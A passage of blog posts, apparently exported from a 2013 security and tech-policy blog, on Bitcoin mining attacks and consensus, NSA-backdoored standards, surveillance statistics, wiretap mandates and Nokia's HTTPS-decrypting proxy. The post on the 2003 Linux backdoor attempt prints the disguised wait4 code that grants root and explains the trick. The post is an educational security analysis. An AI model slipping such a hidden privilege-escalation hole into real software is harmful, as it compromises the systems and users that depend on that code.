our ability to reason about Bitcoin. The cryptography in Bitcoin is considered solid. We also have some ability to model and write equations about miners’ incentives and behavior. Based on this, we thought we had strong reasons to believe that “X% of miners can earn no more than X% of mining revenue.” But if network position can make a difference to the attacker’s prospects, all such bets are off. Weaknesses that depend on the attacker creating “sybil” nodes in the network are in a very different category. Bitcoin’s P2P network is “open to the public.” Nodes can come and go as they please, and are not expected to identify themselves. Running a Bitcoin node means being willing to accept connections from strangers. This makes it problematic to apply existing theoretical models to analyze the security of Bitcoin. It is definitely possible to make the messaging layer of the network more resistant to Sybil attacks. First, Bitcoin allows users to declare other nodes as trusted, effectively forming a “friendnet“, if they were willing to take the effort to do so. Another possibility is to require that potential peer nodes solve a puzzle, similar to the proof-of-work mechanism used for mining rewards [3]. The Bitcoin developers have been taking this issue seriously, and it is likely that they will quickly deploy defenses to shore up the P2P layer against attacks. The security of Bitcoin is frequently portrayed as cryptographic in nature, and economic arguments are sometimes invoked. But so far, a third factor has proven to be at least as important: the responsiveness of the developer community. Perhaps in the future, the theoretical underpinnings will be much more clearly understood, diminishing the need for frequent software and protocol updates in response to potential crises. Alternately, perhaps “Bitcoin will require the emergence of governance structures … to cope with longer-term structural challenges” as Kroll, Davey and Felten argued in a recent paper. In summary, here is the current state of our knowledge: The assumption that X% of the hashpower cannot earn more than X% of the revenue is almost certainly not true, once X% exceeds 33.3%. Network vulnerabilities could potentially make this threshold much smaller. We don’t know for sure yet. Even with an optimal network, and for mining coalitions between 0 and 1/3 of hashpower, we have no proof that honest mining is the most profitable strategy. Even if the paper’s “selfish mining” strategy turns out not to work in this case, it is possible that another strategy exists. Given an adversarial mining strategy, can a coalition form around it? This is an orthogonal question that awaits a definitive answer. Regardless of its other merits, it is likely that this paper will necessitate stronger sybil defenses, and this will further underscore the degree to which Bitcoin’s security currently depends on the actions of its volunteer custodians. [1] There is another assumption necessary for the standard Bitcoin security argument: no investment of X% of the money spent on mining can achieve more than X% of the hashpower. The paper does not challenge this assumption, however. [2] Members of the Bitcoin community have already created simulations that seem to confirm this aspect of the paper’s claims https://bitcointalk.org/index.php?topic=326559.0. [3] Bitcoin developer Greg Maxwell has proposed an efficient “proof-of-storage” puzzle suitable for this purpose https://bitcointalk.org/index.php?topic=310323.0."
"358","2013-11-07","2023-03-24","https://freedom-to-tinker.com/2013/11/07/bitcoin-isnt-so-broken-after-all/","There has been a lot of noise in the Bitcoin world this week about a new paper by Ittay Eyal and Emin Gun Sirer (“ES” for short) of Cornell, which claims that Bitcoin mining is vulnerable to attack. In a companion blog post, Sirer says unequivocally that “bitcoin is broken.” Let me explain why I disagree. This post has three parts. First, I’ll give some necessary background on how Bitcoin works. Second, I’ll explain the essence of the ES attack. Third, I’ll explain a serious flaw in the logic of the ES paper and why, as a result, the ES attack is not nearly as scary as they indicate. Part I: Bitcoin background First, some necessary background on how Bitcoin works. Bitcoin relies on a public ledger that records all transactions in the system. The ledger is represented in a public data structure called the block chain which (as the name implies) is a chain of blocks, each block containing a bunch of transactions along with a link to the previous block in the chain. If you have the block at the end of the chain (i.e. the newest block in the chain), then you can follow the chain backward to the beginning of Bitcoin history, giving you a complete record of all transactions that have ever occurred. (There is some cryptographic verification of blocks.) New blocks are created by mining, a process in which participants (“miners”) race to solve cryptographic search problems. Whoever solves the search problem first gets to create a new block. As a reward, the winning miner gets to add to the new block a special transaction that pays 25 new Bitcoins (worth about $6500 at current exchange rates) to himself. These mining rewards create an incentive for people to spend resources on mining. Although I have spoken of a block “chain,” the chain can have branch points (or “forks”) where a single block has two (or more) blocks that claim to come after it in the chain. By convention, whenever there are two branches of a fork to choose from, participants treat the longest branch as the authoritative one. Shorter branches are ignored. Notice that miners have an incentive to try to extend the branch that will end up being longest, because they want their 25 Bitcoin mining rewards to be on the authoritative chain. (A miner who extends a losing branch will find his “reward” worthless because transactions not on the authoritative chain are ignored.) It has long been known that if a single miner (or a coordinated cartel) controls more than half of the total mining power, then they can be a mining “dictator” and any branch they choose will eventually become the authoritative one, because the dictator, having more mining capacity than everyone else combined, can add new blocks to their chosen branch so fast that no other branch can keep up. But, short of this “51% attack” the conventional wisdom has been that miners’ incentive is to always try to extend the longest branch. (Josh Kroll, Ian Davey, and I published a paper examining this claim and concluding that things are a bit more complicated; but the differences won’t matter for us here.) Part 2: The ES attack With that background in place, let’s look at the argument made in the ES paper. (For brevity, I’ll talk about the case they call gamma=0, but my analysis extends to the other cases as well.) ES describe a mining strategy, which I’ll call ES-mining, and they argue that an ES-miner, or a cartel of ES-miners, who control more than 33.3% of mining power can capture a disproportionate share of the mining rewards. Essentially, ES-miners engage in a series of races against the ordinary miners. The ES-miners build a secret chain of blocks which they hope will grow longer than the ordinary block chain. If it does get longer, then the ES-miners can publish their (previously secret) chain, and it will become authoritative. In the race, the ES-miners have the disadvantage that they have (by assumption) less mining power than the ordinary miners; but the ES-miners have the advantage of knowing how long their secret chain is. By cleverly choosing when to end the race (either by winning or by abandoning the secret chain and restarting the race from the current end-of-chain), the ES-miners create a situation where the block chain sometimes forks causing blocks to be left behind on a losing branch (or “orphaned”), but it turns out that a block made by an ES-miner is less likely to be orphaned than one made by an ordinary miner. The result is that ES-miners have a disproportionate share of their blocks survive in the long-run authoritative chain, therefore they get a disproportionate share of the mining reward. (See the ES paper if you want more details.) Part 3: Flaws in the ES Analysis The analysis in the ES paper has some flaws. The most serious flaw, perhaps, is that, contrary to their claims, a coalition of ES-miners would not be stable, because members of the coalition would have an incentive to cheat on their coalition partners, by using a strategy that I’ll call fair-weather mining. Recall that in the ES attack, a team of ES-miners is racing against a team of ordinary miners, to see who can create a longer block chain. A fair-weather miner pretends to be part of the coalition of ES-miners, but in fact secretly switches teams so that mines for the ES-mining team if that team is ahead in the race, and it mines for the ordinary mining team otherwise. It turns out that every block that the fair-weather miner creates is guaranteed to end up on the winning chain. So the fair-weather miner does better (i.e. gets a better reward) than it could get by playing exclusively on either team. Because a fair-weather miner always gets a better reward than an ES-miner, every member of an ES-mining team will have an incentive to switch over to fair-weather mining. As a result, a coalition of ES-miners is not stable. In short, a coalition of ES-miners cannot form and will not survive. There is a certain poetic justice in this result. ES-miners plan to deviate from the normal agreement that miners should always mine the longest chain. They do this in the hope of extracting extra revenue. But the coalition of ES-miners is itself destroyed because its members secretly deviate from the ES-mining strategy. And the result is that the system returns to normal mining. ES-miners can’t agree to cheat, because it’s too easy for them to cheat on that agreement. There’s a lot more to say about the ES paper, and I’ll probably have more posts about it. For one thing, even if a coalition of ES-miners isn’t possible, can a single ES-miner do damage? Such questions will have to wait—this is already the longest post ever on Freedom to Tinker."
"359","2013-10-18","2023-03-24","https://freedom-to-tinker.com/2013/10/18/when-an-ethnographer-met-edward-snowden/","If you talk about ‘metadata’, ‘big data’ and ‘Big Brother’ just as easily as you order a pizza, ethnography and anthropology are probably not your first points of reference. But the outcome of a recent encounter of ethnographer Tom Boellstorff and Edward Snowden (not IRL but IRP), is that tech policy wonks and researchers should be careful with their day to day vocabulary, as concepts carry politics of control and power. In ‘Making big data, in theory’, ethnographer and anthropologist Tom Boellstorff discusses Edward Snowden’s revelations IRP (In Research Paper). The paper, published on 7 October, is a refreshing 12 page take on the construction of some very dominant concepts in tech policy and research today. Take the concept of ‘metadata’. In support of intelligence programs disclosed by Snowden, proponents claim that one of the most controversial programs is just about ‘metadata’ – who you call, where you were – not about the content of communications. Historical analysis of the Western misconception of Aristotle’s Metaphysics explains how the Greek prefix meta falsely has come to imply hierarchy in our tech language today. With hierarchy comes classification: ‘it establishes an implicit system of control’. Boellstorff argues that such control creates the power to marginalize the actual implications of the program and conveniently obscure such aspects as scale – crucial to the debate as the extremely large scale of the data collection may reveal highly sensitive information about a person, organization or people, as Ed argued in his testimony before the Senate Judiciary Committee. Such rational arguments make perfect sense: it’s much more revealing to learn that I’ve called my shrink four times a week in the last four years, and four times on Christmas eve, than to know what I’ve actually said in a single conversation. But once you control the conceptualization of ‘metadata’, you influence public debate about the intelligence program. Not unlike most of our concepts, ‘metadata’ is not a fact, it is made up. Subsequent re-conceptualization (Bruce Schneier: ‘metadata equals surveillance’) might make perfect sense, but becomes extremely hard and you find yourself on the defence. Or take the concept of ‘big data’, a carefully constructed frame by proponents of systematic surveillance for commercial purposes. The concepts breathes a promise of a crystal ball and a solution for all problems of humankind. While careful theoretical examination of the concept of ‘big data’ is lacking, and in fact the trustworthiness or statistical quality of data analysis is often quite problematic, ‘big data’ has today become institutionalized, part of tech policy lingo and an attractive resource for research funding. Meanwhile, questioning ‘big data’ is to proponents the same as to reject modern life, to reject connecting with friends and, you know, world peace. Yes, we care about your privacy, but we need to solve the problem of aging first. The problem of aging, you mean the natural process that is part of us being humans? In a ‘big data’ world, Boellstorff argues, ‘surveillance’ should not be understood through the lens of Orwell’s Big Brother or Foucault’s Panopticon. A more nuanced metaphor can be found in Foucault’s analysis of the confession, something Boellstorff in a brilliant part of the paper calls an ‘incitement to disclose’. This reminds of Barry Wellman’s networked individualism [pdf]: reject ‘big data’, and risk to be an outcast of your network – both socially and technically, you’re not part of the same systems if you don’t participate. Boellstorff terms this as a ‘dialectic of surveillance and recognition’, a dynamic that spurs a completely different set of trade-offs for users, than merely rejecting Big Brother or the Panopticon post-Snowden. If one follows Boellstorff, addressing surveillance requires a different set of policy responses than usual pleas for oversight, transparency and accountability of intelligence pratices. It illustrates that the many problems around surveillance should take the entire infrastructure for ‘big data’ into account, rather than only one institution or individual technology — as Joris van Hoboken aptly noted with regard to drones at last weeks Drone Conference in NYC. Boellstorff mainly aims to raise theoretical questions about the underlying theory of our concepts, and to warn for carelessness when we talk concepts — because of their inherent politics of power and control. His ethnographic and anthropologic view on tech policy should be a source of introspection and inspiration for all involved in tech research and policy. If we really live in a ‘digital age’, research on the use of our concepts, such as the use of ‘privacy’ in various communities of computer scientists [see Claudia Lopez and Seda Gürses, IEEE P&S 2013, pdf], becomes increasingly important to flesh out the underlying incentives for framing the concepts in the way we do, sometimes even without fully realizing it. ‘Making up big data, in theory’ reminds us that concepts like ‘metadata’, ‘big data’ and ‘Big Brother’ that tech researchers and policymakers use on a daily basis are made up, and may be carefully constructed with a certain politics in mind. Beware of those politics — or would you rather notice someone sneaked in a good chunk of chili on your pizza after you’ve take a bite? Thanks to fellow CITP Fellow Merlyna Lim for pointing me at this paper."
"360","2013-10-09","2023-03-24","https://freedom-to-tinker.com/2013/10/09/the-linux-backdoor-attempt-of-2003/","Josh wrote recently about a serious security bug that appeared in Debian Linux back in 2006, and whether it was really a backdoor inserted by the NSA. (He concluded that it probably was not.) Today I want to write about another incident, in 2003, in which someone tried to backdoor the Linux kernel. This one was definitely an attempt to insert a backdoor. But we don’t know who it was that made the attempt—and we probably never will. Back in 2003 Linux used a system called BitKeeper to store the master copy of the Linux source code. If a developer wanted to propose a modification to the Linux code, they would submit their proposed change, and it would go through an organized approval process to decide whether the change would be accepted into the master code. Every change to the master code would come with a short explanation, which always included a pointer to the record of its approval. But some people didn’t like BitKeeper, so a second copy of the source code was kept so that developers could get the code via another code system called CVS. The CVS copy of the code was a direct clone of the primary BitKeeper copy. But on Nov. 5, 2003, Larry McVoy noticed that there was a code change in the CVS copy that did not have a pointer to a record of approval. Investigation showed that the change had never been approved and, stranger yet, that this change did not appear in the primary BitKeeper repository at all. Further investigation determined that someone had apparently broken in (electronically) to the CVS server and inserted this change. What did the change do? This is where it gets really interesting. The change modified the code of a Linux function called wait4, which a program could use to wait for something to happen. Specifically, it added these two lines of code: if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
        retval = -EINVAL;
 [Exercise for readers who know the C programming language: What is unusual about this code? Answer appears below.] A casual reading by an expert would interpret this as innocuous error-checking code to make wait4 return an error code when wait4 was called in a certain way that was forbidden by the documentation. But a really careful expert reader would notice that, near the end of the first line, it said “= 0” rather than “== 0”. The normal thing to write in code like this is “== 0”, which tests whether the user ID of the currently running code (current->uid) is equal to zero, without modifying the user ID. But what actually appears is “= 0”, which has the effect of setting the user ID to zero. Setting the user ID to zero is a problem because user ID number zero is the “root” user, which is allowed to do absolutely anything it wants—to access all data, change the behavior of all code, and to compromise entirely the security of all parts of the system. So the effect of this code is to give root privileges to any piece of software that called wait4 in a particular way that is supposed to be invalid. In other words … it’s a classic backdoor. This is a very clever piece of work. It looks like innocuous error checking, but it’s really a back door. And it was slipped into the code outside the normal approval process, to avoid any possibility that the approval process would notice what was up. But the attempt didn’t work, because the Linux team was careful enough to notice that that this code was in the CVS repository without having gone through the normal approval process. Score one for Linux. Could this have been an NSA attack? Maybe. But there were many others who had the skill and motivation to carry out this attack. Unless somebody confesses, or a smoking-gun document turns up, we’ll never know. [Post edited (2013-10-09) to correct the spelling of Larry McVoy’s name.]"
"361","2013-09-11","2023-03-24","https://freedom-to-tinker.com/2013/09/11/on-security-backdoors/","I wrote Monday about revelations that the NSA might have been inserting backdoors into security standards. Today I want to talk through two cases where the NSA has been accused of backdooring standards, and use these cases to differentiate between two types of backdoors. The first case concerns a NIST standard, SP 800-90A, which specifies a type of PseudoRandom Generator (PRG). A PRG is a computation that takes a small number of random/unpredictable bits and “stretches” them to get a larger number of unpredictable bits. PRGs are essential to cryptography, serving as the source for most of the secret keys that are used. If you can “break” somebody’s PRG, you can predict which secret keys they will use, thereby allowing you to defeat their crypto. The standard gave a choice of several core algorithms to choose from. One of them uses a mathematical construct called an Elliptic Curve (EC) which I won’t try to explain in this space. This algorithm uses two “public parameters” called P and Q, which are points on the EC. P and Q are public, with specific values written into the standard. Cryptographers believed that if you picked P and Q randomly, the PRG would be secure. But in 2006 two private-sector cryptographers figured out that there is a way to pick P and Q so they have a special relationship to each other. An “outsider” wouldn’t be able to tell that the special relationship existed, but if you knew the “secret key” that described the relationship between P and Q, then you could easily defeat the security of the PRG. At this point, several facts become suddenly interesting. First, NSA people seemed very intent on including this specific algorithm in the standard despite its slow performance. Second, NSA was suggesting specific values of P and Q. Third, NSA was not explaining how those particular P and Q values had been chosen. Interesting, no? All of this could have been addressed by having some kind of public procedure by which new, random P and Q values would be chosen. But that didn’t happen. Yesterday NIST re-opened SP 800-90A for public comment. The second example was explained by John Gilmore. John described his observations from the IPSEC standards process. IPSEC was meant as a foundational security technology, providing crypto for confidentiality and integrity of individual IP packets on the Internet. A successful and widely deployed IPSEC would have been a game-changer for Internet security, putting lots of traffic under cryptographic protection. John says that NSA people and their allies worked consistently to make the standard less secure, more complicated, less efficient, and harder to implement securely. He didn’t see a smoking-gun attempt to introduce a backdoor, but what he describes is a consistent effort to undermine the effectiveness of the standard. And indeed, IPSEC has not had anything like the impact one might have expected. These examples shows us two different kinds of backdoors. In the first PRG case, the NSA was accused of trying to create a backdoor that only it could use, because only it knew the secret key relating P to Q. In the second IPSEC case, the accusation was that the NSA was weakening users’ security against all attackers—the NSA would have easier access to your data, but so would all sorts of other people. To be sure, even a private backdoor might not stay private. If there is a magic secret key that lets the NSA spy on everyone, that key might be misused or it might leak. So the line between an NSA-only backdoor and an open backdoor is always a bit blurry. Still, it seems to me that the two types of backdoors call for different policy debates. It’s one thing to secretly give the NSA easier access to everyone’s data. It’s another thing to give everyone easier access. The latter is worse. We need to look as well at how a backdoor might be created. In the PRG example, the backdoor would have required the NSA to slip a subtle cryptographic weakness past the crypto experts working on a standard. In the IPSEC example, creating the weakness would seem to require coordinated public activity in the standards body over time, and the individual steps would surely be noticed even if nobody spotted a pattern. But one has to wonder whether these examples really were NSA attempts to undermine security, or whether they’re just false alarms. We can’t be sure. As long as the NSA has a license to undermine security standards, we’ll have to be suspicious of any standard in which they participate."
"362","2013-06-15","2023-03-24","https://freedom-to-tinker.com/2013/06/15/the-low-transaction-fee-argument-for-bitcoin-is-silly/","A common argument advanced by Bitcoin proponents is that unlike banks and credit cards, Bitcoin has low (or even zero) transaction fees. The claim is a complete red herring, and in this post I’ll explain why. Let’s assume for the purposes of argument that Bitcoin transaction fees are, in fact, zero. There are small mining-related transaction fees, but it seems plausible that these fees will always be far smaller than those associated with traditional banking. Why do banks and credit cards charge those annoying fees? A major reason is fraud. Banks eat the cost of fraudulent transactions, but pass on the cost to the customer by taking a cut of each legitimate transaction. Fraud is not an artifact of a particular system that we can design away — it is inherent to every form of money handled by humans. To compare Bitcoin meaningfully with traditional banking, then, we must ask how big fraud-related losses are for Bitcoin users. Framed this way, the comparison is not a happy one for Bitcoin. From thefts of wallets to hacks of Bitcoin exchanges, fraud in the Bitcoin ecosystem is rampant. It only gets worse when we add sources of risk other than fraud. A recent study found that 45% of Bitcoin exchanges shut down. Several of the rest have suffered attacks and losses. Granted, one can’t read too much into the numbers at this point, as Bitcoin is still in its pimply-faced adolescence and might very well grow up to be a responsible adult. But there are two major ways in which fraud and other losses in Bitcoin compare quite unfavorably with traditional banking, in a qualitative sense. First, in the libertarian tradition of cypherpunk technologies, Bitcoin shifts a lot of responsibility from institutions to users (of course, that’s part of what’s attractive about it). But users are, and will always be, dramatically worse at security than institutions. There’s a reason why most of us don’t keep our money in cash under our pillows, or worse, carry it around in a briefcase. Second, also in the libertarian tradition of cypherpunk technologies, ownership of bitcoins is defined by crypto and enforced by code. As such, transactions are final, and there is no possibility of recourse to legal or social mechanisms to reverse theft. Put another way, reducing the problem of fraud prevention to that of computer security cannot possibly be an improvement. Because of these problems, as Bitcoin becomes more mainstream, it looks like users will interact through services like Coinbase (which is like Paypal or an online bank, except Bitcoin-based) instead of owning bitcoins directly. This hybrid model will alleviate the problem somewhat, but not entirely. If and when these services mature enough to offer any kind of fraud protection, they will have to start charging higher fees. In other words, Bitcoin by itself is not a payment mechanism, but can serve as the foundation for one. Thus, the claim that Bitcoin payments have low transaction fees is a category error due to looking at the wrong layer of the system. Considering fees together with risk, my prediction is the Bitcoin will remain more expensive than traditional payment services. To summarize, Bitcoin-based payments seem inherently and categorically more fraud-prone and loss-prone than the money transfer systems it competes with. Hyping the absence of transaction fees as a benefit is like touting a new car that is faster and lighter, but neglecting to mention that it’s because the body is made out of plastic. As a final thought, cross-border bank transfers have particularly high transaction fees, and it is possible that Bitcoin could take a chunk out of this market. But I wonder if this might be better understood as an end-run around regulation, likely to get shut down once governments wise up to it. Thanks to Josh Kroll for comments on a draft."
"363","2013-06-08","2023-03-24","https://freedom-to-tinker.com/2013/06/08/revisiting-the-potential-hazards-of-the-protect-america-act/","In light of recent news reports about NSA wiretapping of U.S. Internet communications, folks may be interested in some background on the ‘warrantless wiretapping’ provisions of the Protect America act, and the potential security risks such wiretapping systems can introduce. Here’s a 2007 article a group of us wrote entitled “Risking Communications Security: Potential Hazards of the ‘Protect America’ Act”. http://www.cs.princeton.edu/~jrex/papers/PAA.pdf"
"364","2013-06-10","2023-03-24","https://freedom-to-tinker.com/2013/06/10/51-foreign-test-doesnt-protect-americans/","One of the notable claims we have heard, in light of the Verizon / PRISM revelations, is that data extraction measures are calibrated to make sure that 51% or more of affected individuals are non-U.S. persons. As a U.S. person, I don’t find this at all reassuring. To see why, let’s think about the underlying statistics. As an example, consider Facebook, which appears to have about 1 billion users worldwide, of which roughly 160 million are in the U.S and the other 840 million are foreign. If you collect data about every single Facebook user, then you are getting 84% non-U.S. records. So even a “collect all data” procedure meets the 51% foreign test—despite doing nothing to shield Americans from collection. But let’s assume that intelligence analysts can’t just ask for everything about everybody, but instead are required to use some kind of selector to narrow in on a small number of records. What kinds of selectors will meet the 51% foreign test? One selector that works is just to pick a record at random. That will return a foreign record with 84% probability (because 84% of records are foreign). More generally, a selector that is independent of nationality will easily meet the 51% standard. If a selector matches a fraction F of U.S. persons and also matches the same fraction F of non-U.S. persons, then its output will again be 84% foreign. Even a selector that triggers preferentially on U.S. persons can meet the 51% test. Suppose a selector matches one foreign record out of every 10 million, and one U.S. record out of every 2 million. That’s biased toward selecting U.S records, by a factor of five. Yet the selector will match 84 foreign records and 80 U.S. records, which is 51.2% foreign. So even a selector that is strongly biased toward selecting U.S. records can meet the 51% foreign test. This is just basic statistics. If we’re selecting from an underlying population that is biased on one direction, then the result will be biased in the same direction, unless the selection criteria are biased more strongly in the opposite direction. In a user population that is mostly foreign—which is the case for most or all of the big Internet services—a “51% foreign” test is not at all the same as a “not targeted to U.S. persons” test. [UPDATE (June 10, 2013): In the comments, Steve Checkoway suggests another interpretation of the 51% rule: for each person returned by a query, the analyst must have 51% confidence that that person is non-U.S—and I explain why I think that doesn’t help. There are different ways to interpret a 51% rule, but I don’t think any of them offers much comfort to U.S. persons.]"
"365","2013-06-04","2023-03-24","https://freedom-to-tinker.com/2013/06/04/how-consensus-drives-bitcoin/","Josh Kroll, Ian Davey and I have a new paper on the dynamics of Bitcoin, which we’re going to release in a few days. This post is the first in a series exploring our paper’s analysis of why Bitcoin works and what could derail it. Consensus drives Bitcoin. Like any fiat currency (a currency not backed by anything of intrinsic value), Bitcoin has value because of an expectation that people will continue to accept the currency in payment. Like Tinkerbell, who exists because you believe in her, Bitcoin has value because enough people believe it has value. This much is true for all fiat currencies. But Bitcoin is not just a currency, it is also a technology—and that technology must function correctly for the currency to operate and retain its value. In particular, there are two additional forms of consensus that must exist for Bitcoin to operate. Consensus about the rules: Participants must agree on the rules that determine which transactions are allowed and which are not. The rules for transaction legality are written down, but they are not self-executing. For the rules to have any force, participants must ignore the existence of non-conformant transactions, while accepting conformant transactions. Consensus about history: Participants must agree about the history of the Bitcoin economy, that is about exactly which transactions have occurred. Without this agreement, they can’t know who owns which Bitcoins. Notice that the three forms of consensus—consensus that the currency has value, consensus about the rules, and consensus about history—are interdependent. The loss of any one will unravel the other two. For example, if you and I disagree about what the rules are, then eventually our views of the history will diverge, because eventually one of us will believe a history containing a transaction that the other cannot accept. Or if people can’t agree on who owns which Bitcoins, then the currency will lose its value. Currently all three forms of consensus exist in Bitcoin. One of the key questions we examine in our paper is whether this can change. Obviously the consensus that Bitcoins have value could evaporate for any number of reasons. So we focus on the other two forms of consensus, rules and history, and we ask how stable they are. The consensus on rules needs some explanation, because there is a common misconception that the rules of Bitcoin were laid down at the beginning by Satoshi Nakamoto and cannot be changed. It’s true that Satoshi created the initial ruleset, but the rules can change at any time, if there is a consensus in the community that the rules should be changed. There is also a common misconception that the rules of Bitcoin are somehow self-executing, but that isn’t true either. There is a certain (assumed) mathematical certainty about the cryptography—a digital signature either is or isn’t cryptographically valid—but this doesn’t make the rules self-executing. You can always detect an incorrect digital signature, but the rule that transactions with incorrect signatures should be ignored as invalid will only have force if participants do choose to ignore such transactions. The possibility of changing the rules is not just theoretical—the rules have been changed in the past. One example was in March 2013, when a software bug in one version of the default Bitcoin client caused it to treat as invalid a transaction that was actually valid according to the rules. This amounted to a failure of rules consensus—some people (erroneously) treated the offending transaction as invalid, while others (correctly, according to the rules) treated it as valid. This led to a divergence in the history, as each group had a slightly different idea about who owned which Bitcoins. The community responded to the divergence by temporarily changing the rules in order to reestablish a consensus history. All of this suggests an obvious question: If the rules of Bitcoin can be changed, and have been changed, then how do rule changes happen? Who, if anyone, is in charge, and how does the Bitcoin community govern itself? I’ll turn to this question of Bitcoin governance in a future post."
"366","2013-05-16","2023-03-24","https://freedom-to-tinker.com/2013/05/16/calea-ii-risks-of-wiretap-modifications-to-endpoints/","Today I joined a group of twenty computer scientists in issuing a report criticizing an FBI plan to require makers of secure communication tools to redesign their systems to make wiretapping easy. We argue that the plan would endanger the security of U.S. users and the competitiveness of U.S. companies, without making it much harder for criminals to evade wiretaps. The FBI argues that the Net is “going dark”—that they are losing their ability to carry out valid wiretap warrants. In fact, this seems to be a golden age of surveillance—more collectable communications are available than ever before, including whole new categories of information such as detailed location tracking. Regardless, the FBI wants Congress to require that voice, video, and text communication tools be (re-)designed so that lawful wiretap orders can be executed quickly and silently. Our report focuses in particular on the drawbacks of mandating wiretappability of endpoint tools—that is, tools that reside on the user’s computer or phone. Traditional wiretaps are executed on a provider’s equipment. That approach works for the traditional phone system (wiretap in the phone company’s switching facility) or a cloud service like GMail (get data from the service provider). But for P2P technologies such as Skype, information can only be captured on the user’s computer, which means that the Skype software would have to be changed to add a virtual “wiretap port” that could be activated remotely without the user’s knowledge. Our report argues that mandating a virtual wiretap port in endpoint systems is harmful. The port makes it easier for attackers to capture the very same data that law enforcement wants. Intruders want to capture everything that happens on a compromised computer. They will be happy to see a built-in tool for capturing and extracting large amounts of audio, video, and text traffic. Better yet (for the intruder), the capability will be stealthy by design, making it difficult for the user to tell that anything is amiss. Beyond this, the mandate would make it harder for users to understand, monitor, and fix their own systems—which is bad for security. If a system’s design is too simple or its operation too transparent or too easy to monitor, then wiretaps will be evident. So a wiretappability mandate will push providers toward complex, obfuscated designs that are harder to secure and raise the total cost of building and operating the system. Finally, our report argues that it will not be possible to block non-compliant implementations. Many of today’s communication tools are open source, and there is no way to hide a capability within an open source code base, nor to prevent people from simply removing or disabling an undesired feature. Even closed source systems are routinely modified by users—as with jailbreaking of phones—and users will find ways to disable features they don’t want. Criminals will want to disable these features. Ordinary users will also want to disable them, to mitigate their security risks. Our report discusses other issues, such as the impact of a wiretappability mandate on the ability of U.S. companies to compete in international markets. The bottom line is that harms that would result from the FBI’s plan vastly outweigh any benefits. The cybersecurity problem is bad enough as it is. Let’s not make it any worse. [Signers of the report are Ben Adida, Collin Anderson, Annie I. Anton (Georgia Institute of Technology), Matt Blaze (University of Pennsylvania), Roger Dingledine (The Tor Project), Edward W. Felten (Princeton University), Matthew D. Green (Johns Hopkins University), J. Alex Halderman (University of Michigan), David R. Jefferson (Lawrence Livermore National Laboratory), Cullen Jennings, Susan Landau (privacyink.org), Navroop Mitter, Peter G. Neumann (SRI International), Eric Rescorla (RTFM, Inc.), Fred B. Schneider (Cornell University), Bruce Schneier (BT Group), Hovav Shacham (University of California, San Diego), Micah Sherr (Georgetown University), David Wagner (University of California, Berkeley), and Philip Zimmermann (Silent Circle, LLC). [Affiliations for identification purposes only. CDT coordinated the creation of the report.]"
"367","2013-01-11","2023-03-24","https://freedom-to-tinker.com/2013/01/11/how-the-nokia-browser-decrypts-ssl-traffic-a-man-in-the-client/","Over the past couple of days there has been some press coverage over security researcher Guarang Pandya’s report that the browser on his Nokia phone was sending all of his traffic to Nokia proxy servers, including his HTTPS traffic. The disturbing part of his report was evidence that Nokia is not just proxying, but actually decrypting the HTTPS traffic. Nokia replied with a statement (in the comments section of Pandya’s blog post, and to several news outlets): We take the privacy and security of our consumers and their data very seriously. The compression that occurs within the Nokia Xpress Browser means that users can get faster web browsing and more value out of their data plans. Importantly, the proxy servers do not store the content of web pages visited by our users or any information they enter into them. When temporary decryption of HTTPS connections is required on our proxy servers, to transform and deliver users’ content, it is done in a secure manner. Nokia has implemented appropriate organizational and technical measures to prevent access to private information. Claims that we would access complete unencrypted information are inaccurate. We aim to be completely transparent on privacy practices. As part of our policy of continuous improvement we will review the information provided in the mobile client in case this can be improved. You can find out more about Nokia’s privacy practices at http://www.nokia.com/privacy. So, it turns out that Pandya was correct: Nokia is decrypting SSL traffic in their proxy servers. This is not disclosed in their privacy policy, and the somewhat vague assurance of things being done “in a secure manner” is not entirely comforting. Beyond that, the statement gave some other interesting clues. One clue was that this is a feature of the Nokia Xpress Browser, an app that is available for the popular Nokia Lumia phones that run Windows Phone 8. These phones are available from the major US carriers, whereas Pandya’s phone (the Asha) is mostly sold abroad. So I tracked down a Lumia phone, installed Nokia Xpress, and did my own investigation. Results after the jump. How is SSL Decryption Possible? Pandya’s evidence that Nokia was performing what amounts to a man-in-the-middle attack was a packet sniffing session in which he browsed to https://google.com and observed that the certificate being passed to his phone was for the domain “cloud1.browser.ovi.com.” That is abnormal and troubling. The certificates should be for “google.com.” He posted some screenshots of the certificates, but I managed to pull out the actual contents of the certificate via my Lumia phone running Nokia Xpress. The geeks can view it here. For whatever reason, this one was issued to “wp.browser.ovi.com”, but you can see that it chains up to a trusted Verisign root by way of intermediate Verisign certificates: Issuer: C=US, O=VeriSign, Inc., OU=VeriSign Trust Network, OU=Terms of use at https://www.verisign.com/rpa (c)10, CN=VeriSign Class 3 Secure Server CA – G3 Validity Not Before: Jun 20 00:00:00 2012 GMT Not After : Jun 21 23:59:59 2013 GMT Subject: C=US, ST=Illinois, L=Chicago, O=Nokia, OU=OVI Browser, CN=wp.browser.ovi.com It was also clear, based on my own packet sniffing, that HTTPS traffic intended for https://freedom-to-tinker.com was going to wp.browser.ovi.com. In our server logs, I witnessed the requests emerging from the other side of the Nokia proxy system: 64.27.165.35 – – [10/Jan/2013:22:13:01 -0500] “GET /wp-content/themes/education/images/rss.png HTTP/1.1” 200 526 “-” “Mozilla/5.0 (Series40; Nokia311/05.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.8.0.50.5” (Note, the connection being made here is an HTTPS connection–that is all that our server accepts). All of this simply confirms what Pandya observed, and what Nokia admitted. But what would cause this behavior? You would expect your web browser to receive certificates for the secure web site that it claims you are connected to. Apparently, Nokia browser on Pandya’s phone, and Nokia Xpress on Windows Phone 8, translate your requests to secure sites into requests to the Nokia proxy server before it ever leaves your phone. Commenters on Pandya’s post have been arguing about whether this constitutes a “man-in-the-middle” or not. I suppose that it’s more of a “man-in-the-client” that supports the second “man-in-the-middle” on the proxy. Is that what’s really happening? There could have been a less disturbing explanation of this behavior. It could have been the case that Nokia was simply tunneling HTTPS over HTTPS–that is, they took your request for https://google.com and left it unchanged, but wrapped in in another layer of HTTPS to be sent to their servers. This would maintain end-to-end encryption, while performing a traditional proxy role. The evidence that Pandya gathered and that I verified does not conclusively tell us whether this is the case, but Nokia’s public statement seems to indicate that the more troubling version of events is occurring: “When temporary decryption of HTTPS connections is required on our proxy servers, to transform and deliver users’ content…” Isn’t this the same as what Opera Mini is doing? There is an increasing trend to build simplified browsers for mobile devices in which optimizations are done by a proxy server. Silk for the Kindle Fire is an example, but Silk doesn’t perform proxy decryption of SSL connections. 